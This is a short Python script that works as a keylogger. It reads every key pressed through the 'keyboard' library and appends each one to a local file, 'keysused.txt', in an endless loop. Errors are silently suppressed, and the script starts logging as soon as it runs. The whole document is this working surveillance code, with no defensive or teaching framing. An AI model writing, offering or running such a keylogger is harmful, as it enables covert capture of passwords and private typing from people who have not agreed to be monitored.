import keyboard


def key_logger():
    log_file = 'keysused.txt'
    while True:
        try:
            with open(log_file, 'a') as f:
                f.write(str(keyboard.read_key()) + '\n')
        except:
            pass

key_logger()